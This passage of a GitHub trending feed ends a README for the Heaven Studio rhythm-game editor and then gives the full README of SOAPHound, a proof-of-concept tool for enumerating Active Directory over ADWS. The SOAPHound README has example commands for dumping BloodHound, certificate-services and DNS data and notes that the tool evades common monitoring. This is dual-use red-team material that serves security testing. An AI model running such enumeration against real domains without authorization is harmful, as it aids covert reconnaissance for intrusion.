href=&#34;https://rheavenstudio.itch.io/heaven-studio&#34;&gt;itch.io page&lt;/a&gt;. GitHub Actions creates experimental builds on each commmit, but minimal support will be provided.&lt;/p&gt; &#xA;&lt;h3&gt;Alpha builds&lt;/h3&gt; &#xA;&lt;p&gt;These builds target future patches / minor releases and thus do not include some of the features from Nightly.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nightly.link/RHeavenStudio/HeavenStudio/workflows/build/release_1_patches/StandaloneWindows64-build.zip&#34;&gt;Windows&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nightly.link/RHeavenStudio/HeavenStudio/workflows/build/release_1_patches/StandaloneLinux64-build.zip&#34;&gt;Linux&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nightly.link/RHeavenStudio/HeavenStudio/workflows/build/release_1_patches/StandaloneOSX-build.zip&#34;&gt;MacOS&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Nightly builds&lt;/h3&gt; &#xA;&lt;p&gt;These builds include experimental new features that target future major releases.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nightly.link/RHeavenStudio/HeavenStudio/workflows/build/master/StandaloneWindows64-build.zip&#34;&gt;Windows&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nightly.link/RHeavenStudio/HeavenStudio/workflows/build/master/StandaloneLinux64-build.zip&#34;&gt;Linux&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nightly.link/RHeavenStudio/HeavenStudio/workflows/build/master/StandaloneOSX-build.zip&#34;&gt;MacOS&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Important Notes:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;On MacOS and Linux builds you may &lt;a href=&#34;https://github.com/RHeavenStudio/HeavenStudio/issues/72&#34;&gt;experience bugs with audio-related tasks&lt;/a&gt;, but in most cases Heaven Studio works perfectly.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Self-Building&lt;/h2&gt; &#xA;&lt;p&gt;Heaven Studio is made in &lt;a href=&#34;https://unity.com/releases/editor/whats-new/2021.3.21&#34;&gt;Unity 2021.3.21&lt;/a&gt;, and programmed with &lt;a href=&#34;https://code.visualstudio.com/&#34;&gt;Visual Studio Code&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Build Instructions: &lt;a href=&#34;https://github.com/megaminerjenny/HeavenStudio/raw/master/BUILD.md&#34;&gt;BUILD.md&lt;/a&gt; (or the more maintained &lt;a href=&#34;https://rheavenstudio.github.io/docs-contributing/setup/introduction&#34;&gt;documentation page&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h2&gt;Other information&lt;/h2&gt; &#xA;&lt;p&gt;Rhythm Heaven is the intellectual property of Nintendo. This program is NOT endorsed nor sponsored in any way by Nintendo. All used properties of Nintendo (such as names, audio, graphics, etc.) in this software are not intended to maliciously infringe trademark rights. All other trademarks and assets are property of their respective owners. This is a community project and this is available for others to use according to the GPL-3.0 license, without charge.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>FalconForceTeam/SOAPHound</title>
    <updated>2024-02-04T01:47:26Z</updated>
    <id>tag:github.com,2024-02-04:/FalconForceTeam/SOAPHound</id>
    <link href="https://github.com/FalconForceTeam/SOAPHound" rel="alternate"></link>
    <summary type="html">&lt;p&gt;SOAPHound is a custom-developed .NET data collector tool which can be used to enumerate Active Directory environments via the Active Directory Web Services (ADWS) protocol.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/FalconForceTeam/SOAPHound/main/soaphound-logo.png&#34; alt=&#34;logo&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Description&lt;/h1&gt; &#xA;&lt;p&gt;SOAPHound is a .NET data collector tool, which collects Active Directory data via the Active Directory Web Services (ADWS) protocol.&lt;/p&gt; &#xA;&lt;p&gt;SOAPHound is an alternative to a number of open source security tools which are commonly used to extract Active Directory data via LDAP protocol. SOAPHound is able to extract the same information without directly communicating to the LDAP server. Instead, LDAP queries are wrapped within a series of SOAP messages, which are sent to the ADWS server using NET TCP Binding communication channel. Following, ADWS server unwraps the LDAP queries and forwards them to the LDAP server running on the same Domain Controller. As a result, LDAP traffic is not sent via the wire and therefore is not easily detected by common monitoring tools.&lt;/p&gt; &#xA;&lt;p&gt;Note that this is a proof of concept tool and is not intended for production use. The tool is provided as is, without warranty of any kind.&lt;/p&gt; &#xA;&lt;p&gt;For additional details on the SOAPHound tool, please refer to the following blog post: &lt;a href=&#34;https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/&#34;&gt;SOAPHound — tool to collect Active Directory data via ADWS&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;p&gt;The &lt;code&gt;--help&lt;/code&gt; command line argument can be used to display the following usage information:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;SOAPHound&#xA;Copyright (c) 2024 FalconForce&#xA;&#xA;Connection and authentication options:&#xA;  --user                   Username to use for ADWS Connection. Format: domain\user or user@domain&#xA;  --password               Password to use for ADWS Connection&#xA;  --domain                 Specify domain for enumeration&#xA;  --dc                     Domain Controller to connect to&#xA;&#xA;Supported collection methods:&#xA;  --buildcache             (Default: false) Only build cache and not perform further actions&#xA;  --dnsdump                (Default: false) Dump AD Integrated DNS data&#xA;  --certdump               (Default: false) Dump AD Certificate Services data&#xA;  --bhdump                 (Default: false) Dump BH data&#xA;&#xA;Output options:&#xA;  -o, --outputdirectory    Folder to output files to (full path needed)&#xA;  -c, --cachefilename      Filename for the cache file (full path needed)&#xA;&#xA;Splitting options:&#xA;  -a, --autosplit          (Default: false) Enable AutoSplit mode: automatically split object retrieval on two depth levels based on defined trheshold&#xA;  -t, --threshold          (Default: 0) AutoSplit mode: Define split threshold based on number of objects per starting letter&#xA;&#xA;Miscellaneous options:&#xA;  --nolaps                 (Default: false) Do not request LAPS related information&#xA;  --showstats              Show stats of local cache file&#xA;  --logfile                Create log file&#xA;  --help                   Display this help screen.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Connection and authentication options&lt;/h1&gt; &#xA;&lt;h2&gt;Authentication&lt;/h2&gt; &#xA;&lt;p&gt;SOAPHound supports the following authentication methods:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Using the existing authentication token of the current user. This is the default option if no username and password are supplied.&lt;/li&gt; &#xA; &lt;li&gt;Supplying a username and password on the command line.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Domain Connection Information&lt;/h2&gt; &#xA;&lt;p&gt;When SOAPHound runs in a domain-joined machine, it will automatically attempt to connect to the Domain Controller of the domain the machine is joined to. This can be overridden by supplying the &lt;code&gt;--dc&lt;/code&gt; and &lt;code&gt;--domain&lt;/code&gt; command line arguments.&lt;/p&gt; &#xA;&lt;h1&gt;Supported collection methods&lt;/h1&gt; &#xA;&lt;p&gt;One of the following collection methods must be specified:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;--buildcache&lt;/code&gt;: Only build cache and not perform further actions&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;--bhdump&lt;/code&gt;: Dump BloodHound data&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;--certdump&lt;/code&gt;: Dump AD Certificate Services (ADCS) data&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;--dnsdump&lt;/code&gt;: Dump AD Integrated DNS data&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Building the cache&lt;/h2&gt; &#xA;&lt;p&gt;SOAPHound is able to generate a cache file that contains basic information about all domain objects, such as Security Identifier (SID), Distinguished Name (DN) and ObjectClass. This cache file is required for BloodHound related data collection (i.e. the &lt;code&gt;--bhdump&lt;/code&gt; and &lt;code&gt;--certdump&lt;/code&gt; collection methods), since it is used when crafting the trust relationships between objects via the relevant Access Control Entries (ACEs).&lt;/p&gt; &#xA;&lt;p&gt;An example command to build the cache file is:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;SOAPHound.exe --buildcache -c c:\temp\cache.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will generate a cache file in the &lt;code&gt;c:\temp&lt;/code&gt; folder. The cache file is a JSON formatted mapping of basic information about all domain objects. To view some statistics about the cache file (i.e. number of domain objects starting with each letter), you can use the &lt;code&gt;--showstats&lt;/code&gt; command line argument:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;SOAPHound.exe --showstats -c c:\temp\cache.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Collecting BloodHound Data&lt;/h2&gt; &#xA;&lt;p&gt;After the cache file has been generated, you can use the &lt;code&gt;--bhdump&lt;/code&gt; collection method to collect data from the domain that can be imported into BloodHound.&lt;/p&gt; &#xA;&lt;p&gt;An example command to collect BloodHound data is (note that this references the cache file generated in the previous step):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If the targeted domain does not use LAPS, you can use the &lt;code&gt;--nolaps&lt;/code&gt; command line argument to skip the LAPS related data collection.&lt;/p&gt; &#xA;&lt;p&gt;This command will generate the &lt;code&gt;c:\temp\bloodhound-output&lt;/code&gt; folder and produce a number of JSON files that can be imported into BloodHound. The JSON files contain the collected Users, Groups, Computers, Domains, GPOs and Containers, including their relationships. SOAPHound is compatible with Bloodhound version 4.&lt;/p&gt; &#xA;&lt;h3&gt;Dealing with large domains&lt;/h3&gt; &#xA;&lt;p&gt;If you are dealing with a large domain, you may run into issues with the amount of data that can be retrieved in a single request. To deal with this, SOAPHound supports the &lt;code&gt;--autosplit&lt;/code&gt; and &lt;code&gt;--threshold&lt;/code&gt; command line arguments.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;--autosplit&lt;/code&gt; command line argument enables the AutoSplit mode, which will automatically split object retrieval on two depth levels based on a defined threshold. The &lt;code&gt;--threshold&lt;/code&gt; command line argument defines the split threshold based on the number of objects per starting letter.&lt;/p&gt; &#xA;&lt;p&gt;An example command to collect BloodHound data in AutoSplit mode is:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 1000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will generate the output in batches of a maximum of 1000 objects per starting letter. If there are more than 1000 objects for a single starting letter, SOAPHound will use two depth levels to retrieve the objects. This will result in larger number of queries, each one returning a maximum of 1000 objects.&lt;/p&gt; &#xA;&lt;p&gt;For example if there are 2000 objects starting with the letter &lt;code&gt;a&lt;/code&gt;, SOAPHound will retrieve objects starting with &lt;code&gt;aa&lt;/code&gt;, &lt;code&gt;ab&lt;/code&gt;, &lt;code&gt;ac&lt;/code&gt;, etc., each in a separate query to avoid timeouts.&lt;/p&gt; &#xA;&lt;h2&gt;Collecting ADCS Data&lt;/h2&gt; &#xA;&lt;p&gt;After the cache file has been generated, you can use the &lt;code&gt;--certdump&lt;/code&gt; collection method to collect ADCS data from the domain that can be imported into BloodHound. This collection method does not support the &lt;code&gt;--autosplit&lt;/code&gt; and &lt;code&gt;--threshold&lt;/code&gt; command line arguments.&lt;/p&gt; &#xA;&lt;p&gt;An example command to collect ADCS data is (note that this references the cache file generated in previous step):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;SOAPHound.exe -c c:\temp\cache.txt --certdump -o c:\temp\bloodhound-output&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This command will generate the &lt;code&gt;c:\temp\bloodhound-output&lt;/code&gt; folder and produce two JSON files that can be imported into BloodHound, containing information about the Certificate Authorities (CA) and Certificate Templates. SOAPHound is compatible with Bloodhound version 4 and ADCS data are classified as GPO objects in Bloodhound.&lt;/p&gt; &#xA;&lt;h2&gt;Collecting AD Integrated DNS Data&lt;/h2&gt; &#xA;&lt;p&gt;Apart from BloodHound data, SOAPHound can also be used to collect AD Integrated DNS data. This does not require a cache file and does not support the &lt;code&gt;--autosplit&lt;/code&gt; and &lt;code&gt;--threshold&lt;/code&gt; command line arguments.&lt;/p&gt; &#xA;&lt;p&gt;An example command to collect AD Integrated DNS data is:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;SOAPHound.exe --dnsdump -o c:\temp\dns-output&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This command will generate a file namely DNS.txt in the &lt;code&gt;c:\temp\dns-output&lt;/code&gt; folder that contains a dump of all the AD Integrated DNS data.&lt;/p&gt; &#xA;&lt;h1&gt;Acknowledgements&lt;/h1&gt; &#xA;&lt;p&gt;This tool is based on the work of the following open source projects:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/BloodHoundAD/SharpHound/tree/dev&#34;&gt;SharpHound&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/FuzzySecurity/StandIn&#34;&gt;StandIn&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/GhostPack/Certify&#34;&gt;Certify&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Another big thanks to &lt;a href=&#34;https://github.com/vletoux/pingcastle&#34;&gt;PingCastle&lt;/a&gt; for their reference implementation of the ADWS protocol. While we do not use their code directly, it was a great help in understanding the protocol and realizing the potential of the ADWS protocol.&lt;/p&gt;</summary>
  </entry>
</feed>